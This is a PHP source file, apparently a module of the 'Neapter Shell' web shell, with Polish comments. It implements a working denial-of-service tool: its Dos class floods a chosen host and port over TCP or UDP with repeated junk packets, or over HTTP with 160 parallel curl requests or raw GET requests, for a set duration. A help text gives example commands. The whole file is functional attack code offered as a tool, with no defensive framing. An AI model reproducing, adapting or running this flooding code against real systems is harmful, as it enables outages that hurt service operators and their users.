<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Dos - Wyjatki
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Tools\Exception
 */
class DosException extends Exception {}

/**
 * Denial of Service
 *
 * Dostepne protokoly to tcp, udp, http
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Tools
 */
class Dos
{
	/**
	 * Adres hosta
	 *
	 * @access protected
	 * @var    string
	 */
	protected $sHost;

	/**
	 * Port
	 *
	 * @access protected
	 * @var    integer
	 */
	protected $iPort = 0;

	/**
	 * Typ mysql, ssh2, ftp, http
	 *
	 * @access protected
	 * @var    string
	 */
	protected $sType;

	/**
	 * Czas trwania ataku
	 *
	 * @access protected
	 * @var    integer
	 */
	protected $iTime = 30;

	/**
	 * Otwieranie za kazdym razem nowego polaczenia
	 *
	 * @access protected
	 * @var    boolean
	 */
	protected $bNewConnection = TRUE;

	/**
	 * Godzina przerwania ataku
	 *
	 * @access protected
	 * @var    float
	 */
	protected $fTime = 0.0;

	/**
	 * Czy CURL jest dostepny
	 *
	 * @access protected
	 * @var    boolean
	 */
	protected $bCurl = FALSE;

	/**
	 * Czy funkcja fsockopen jest dostepna
	 *
	 * @access protected
	 * @var    boolean
	 */
	protected $bFsockopen = FALSE;

	/**
	 * Czy funkcja pfsockopen jest dostepna
	 *
	 * @access protected
	 * @var    boolean
	 */
	protected $bPfsockopen = FALSE;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @return void
	 */
	public function __construct()
	{
		/**
		 * Dostepnosc rozszerzen / funkcji
		 */
		$this -> bCurl       = extension_loaded( 'curl' );
		$this -> bFsockopen  = function_exists( 'fsockopen' );
		$this -> bPfsockopen = function_exists( 'pfsockopen' );
	}
	/**
	 * Ustawianie host'a
	 *
	 * @access public
	 * @param  string            $sValue Host
	 * @return PasswordRecovery          Obiekt PasswordRecovery
	 */
	public function setHost( $sValue )
	{
		@ list( $sHost, $iPort ) = explode( ':', $sValue );

		if( ctype_digit( $iPort ) )
		{
			$this -> sHost = $sHost;
			$this -> iPort = $iPort;
		}
		else
		{
			$this -> sHost = $sValue;
		}

		return $this;
	}

	/**
	 * Ustawianie typu ataku
	 *
	 * @access public
	 * @param  string           $sValue
	 * @return PasswordRecovery         Obiekt PasswordRecovery
	 */
	public function setType( $sValue )
	{
		static $aTypes = array
		(
			'tcp',
			'udp',
			'http'
		);

		$sValue = strtolower( $sValue );

		if( ! in_array( $sValue, $aTypes ) )
		{
			throw new DosException( 'Błędny typ ataku' );
		}

		/**
		 * Czy podane funkcje istnieja
		 */
		if( ( ( $sValue === 'tcp' ) || ( $sValue === 'udp' ) ) && ( ! $this -> bFsockopen || ! $this -> bPfsockopen ) )
		{
			throw new DosException( 'Funkcja fsockopen i pfsockopen nie jest dostępna' );
		}

		if( ( $sValue === 'http' ) && ! $this -> bCurl && ! $this -> bFsockopen && ! $this -> bPfsockopen )
		{
			throw new DosException( 'Rozszerzenie CURL i funkcje fsockopen i pfsockopen nie są dostępne' );
		}

		$this -> sType = $sValue;

		return $this;
	}

	/**
	 * Ustawianie czasu trwania ataku
	 *
	 * @access public
	 * @param  integer          $iValue Czas trwania ataku
	 * @return PasswordRecovery         Obiekt PasswordRecovery
	 */
	public function setTime( $iValue )
	{
		$this -> iTime = abs( (int) $iValue );

		return $this;
	}

	/**
	 * Otwieranie za kazdym razem nowego polaczenia
	 *
	 * @access public
	 * @param  boolean          $bValue Otwieranie za kazdym razem nowego polaczenia
	 * @return PasswordRecovery         Obiekt PasswordRecovery
	 */
	public function setNewConnection( $bValue )
	{
		$this -> bNewConnection = (boolean) $bValue;

		return $this;
	}

	/**
	 * Wykonanie ataku
	 *
	 * @access public
	 * @return void
	 */
	public function get()
	{
		/**
		 * Typ ataku jest wymagany
		 */
		if( $this -> sType === NULL )
		{
			throw new DosException( 'Nie wybrano typu ataku' );
		}

		/**
		 * Host jest wymagany
		 */
		if( $this -> sHost === NULL )
		{
			throw new DosException( 'Nie wprowadzono hosta' );
		}

		/**
		 * Host jest wymagany
		 */
		if( $this -> iPort === 0 )
		{
			throw new DosException( 'Nie wprowadzono hosta' );
		}

		/**
		 * Aktualny czas
		 */
		$this -> fTime = microtime( 1 ) + $this -> iTime;

		printf( "DoS %s - %s:%d\r\n\r\n", $this -> sType, $this -> sHost, $this -> iPort );

		/**
		 * Dzieki takiek konstrukcji latwiej mozna dodac nowy atak
		 */
		switch( $this -> sType )
		{
			case 'tcp':
				$this -> getAttackTcp();
				break ;
			case 'udp':
				$this -> getAttackUdp();
				break ;
			case 'http':
				$this -> getAttackHttp();
		}

		/**
		 * Koncowe statystyki
		 */
		echo "\r\nZakończono atak";
	}

	/**
	 * Zwracanie zasobu fsockopen / pfsockopen
	 *
	 * @access    protected
	 * @staticvar string    $sProtocol Protokol TCP / UDP
	 * @return    resource             Zasob fsockopen / pfsockopen
	 */
	protected function getConnection()
	{
		static $sProtocol;

		if( $sProtocol === NULL )
		{
			$sProtocol = ( ( $this -> sType === 'udp' ) ? 'udp' : 'tcp' );
		}

		if( ! $this -> bFsockopen )
		{
			$rConn = pfsockopen( $sProtocol . '://' . $this -> sHost, $this -> iPort );
		}
		else
		{
			$rConn = fsockopen( $sProtocol . '://' . $this -> sHost, $this -> iPort );
		}

		if( ! $rConn )
		{
			throw new DosException( sprintf( 'Nie można połączyć się z hostem %s:%d', $this -> sHost, $this -> iPort ) );
		}

		return $rConn;
	}

	/**
	 * Floodowanie tcp
	 *
	 * @access protected
	 * @return void
	 */
	protected function getAttackTcp()
	{
		$rConn = $this -> getConnection();

		$i = 0;
		$sPacket = str_repeat( 'x', 1024 );
		do
		{
			if( ! fwrite( $rConn, $sPacket ) )
			{
				$rConn = $this -> getConnection();
			}

			if( ++$i % 1024 === 0 )
			{
				echo '.';
				@ ob_flush();
				@ flush();
			}

			if( $i % 102400 === 0 )
			{
				printf( " - %5d MB\r\n", $i / 1024 );
			}

			if( $this -> bNewConnection )
			{
				$rConn = $this -> getConnection();
			}
		}
		while( $this -> fTime > microtime( 1 ) );

		printf( "\r\n\r\nWysłano %dMB danych w ciągu %d s\r\n", $i / 1024, $this -> iTime );
	}

	/**
	 * Floodowanie udp
	 *
	 * @access protected
	 * @return void
	 */
	protected function getAttackUdp()
	{
		$rConn = $this -> getConnection();

		$i = 0;
		$sPacket = str_repeat( 'x', 1472 );

		do
		{
			if( ! fwrite( $rConn, $sPacket ) )
			{
				$rConn = $this -> getConnection();
			}

			if( $this -> bNewConnection )
			{
				$rConn = $this -> getConnection();
			}

			if( ++$i % 723 === 0 )
			{
				echo '.';
				@ ob_flush();
				@ flush();
			}

			if( $i % 72300 === 0 )
			{
				printf( " - %5d MB\r\n", $i / 723 );
			}
		}
		while( $this -> fTime > microtime( 1 ) );

		printf( "\r\n\r\nWysłano %dMB danych w ciągu %d s\r\n", $i / 723, $this -> iTime );
	}

	/**
	 * Floodowanie http
	 *
	 * @access protected
	 * @return void
	 */
	protected function getAttackHttp()
	{
		$i = 0;

		/**
		 * Flood z uzyciem CURL'a
		 */
		if( $this -> bCurl )
		{
			$aCurl = array();
			$aCurlMulti = array();

			/**
			 * Opcje dla CURL'a
			 */
			$aCurlOpt = array
			(
				CURLOPT_URL             => $this -> sHost,
				CURLOPT_USERAGENT       => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.11 (pl,pl-PL;q=0.9,en;q=0.8)',
				CURLOPT_TIMEOUT         => 5,
				CURLOPT_AUTOREFERER	=> TRUE,
				CURLOPT_LOW_SPEED_LIMIT => 2,
				CURLOPT_LOW_SPEED_TIME	=> 20,
				CURLOPT_HTTPHEADER      => array( 'Connection: Keep-Alive' ),
				CURLOPT_RETURNTRANSFER  => TRUE
			);

			do
			{
				$aCurlMulti[ $i ] = curl_multi_init();

				for( $j = 0; $j < 160; $j++ )
				{
					$aCurl[ $j ] = curl_init();

					curl_setopt_array( $aCurl[ $j ], $aCurlOpt );
					curl_multi_add_handle( $aCurlMulti[ $i ], $aCurl[ $j ] );
				}

				$iRes = 0;

				for( $j = 0; $j < 500; $j++  )
				{
					curl_multi_exec( $aCurlMulti[ $i ], $iRes );
					usleep( 1000 );

					if( $iRes === 0 )
					{
						break ;
					}
				}

				if( ++$i % 10 === 0 )
				{
					echo '.';
					@ ob_flush();
					@ flush();
				}

				if( $i % 1000 === 0 )
				{
					printf( " - %5d połączeń\r\n", $i );
				}
			}
			while( $this -> fTime > microtime( 1 ) );

			printf( "\r\n\r\nUstanowiono %d połączeń w ciągu %d sekund, prędkość: %d c/s\r\n", $i * 160, $this -> iTime, $i * 160 / $this -> iTime  );

		}
		/**
		 * Fsockopen
		 */
		else
		{
			preg_match( '~^http://([^/]+)(.+)?~', $this -> sHost, $aHost );

			$sUrl = ( isset( $aHost[2] ) ? $aHost[2] : '/' );
			$sHost = $aHost[1];

			$sPacket = sprintf( "GET %s HTTP/1.1\r\n" .
					"User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.11 (pl,pl-PL;q=0.9,en;q=0.8)\r\n" .
					"Host: %s\r\n" .
					"Accept: */*\r\n" .
					"Connection: Keep-Alive\r\n\r\n",
					$sUrl, $sHost
			);

			$this -> sHost = gethostbyname( $sHost );
			$this -> iPort = 80;

			do
			{
				$rConn = $this -> getConnection();
				fwrite( $rConn, $sPacket );

				if( ++$i % 10 === 0 )
				{
					echo '.';
					@ ob_flush();
					@ flush();
				}

				if( $i % 1000 === 0 )
				{
					printf( " - %5d\r\n", $i);
				}
			}
			while( $this -> fTime > microtime( 1 ) );

			printf( "\r\n\r\nUstanowiono %d połączeń w ciągu %d sekund, prędkość: %d c/s\r\n", $i, $this -> iTime, $i / $this -> iTime  );
		}
	}

}

/**
 * =================================================================================================
 */

/**
 * Denial of Service - UDP / TCP oraz HTTP
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleDos extends ModuleAbstract
{
	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array
		(
			'dos',
			'flood'
		);
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.03 2011-01-26 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Denial Of Service - floodowanie tcp, udp i http

	Typ:
		tcp
		udp
		http

	Opcje:
		-n  wysłanie pakietu a następnie utworzenie nowego połączenia,
		    przy wysłaniu 100MB mamy utworzonych 100 połączeń, bez tej opcji wszystkie dane
		    zostaną wysłane przy pomocy jednego połączenia, dla 'http' połączenie będzie
		    typu 'Keep-Alive' jeżeli jest dostępne

	Użycie:
		dos http http://localhost/auth/ czas_trwania_ataku_w_sekundach
		dos typ host:port czas_trwania_ataku_w_sekundach

	Przykład:
		dos http http://localhost/auth/ 60
		dos tcp localhost:80 60
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Czy modul jest zaladowany
		 */
		if( ! class_exists( 'Dos' ) )
		{
			return 'dos, flood - !!! moduł nie został załadowany';
		}

		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc !== 3 )
		{
			return $this -> getHelp();
		}

		header( 'Content-Type: text/plain; charset=utf-8' );

		try
		{
			ob_start();

			$oDos = new Dos();
			$oDos
				-> setHost( $this -> oShell -> aArgv[1] )
				-> setType( $this -> oShell -> aArgv[0] )
				-> setTime( $this -> oShell -> aArgv[2] )
				-> setNewConnection( in_array( 'n', $this -> oShell -> aOptv ) )
				-> get();

			ob_end_flush();
		}
		catch( DosException $oException )
		{
			echo $oException -> getMessage();
		}

		exit;
	}

}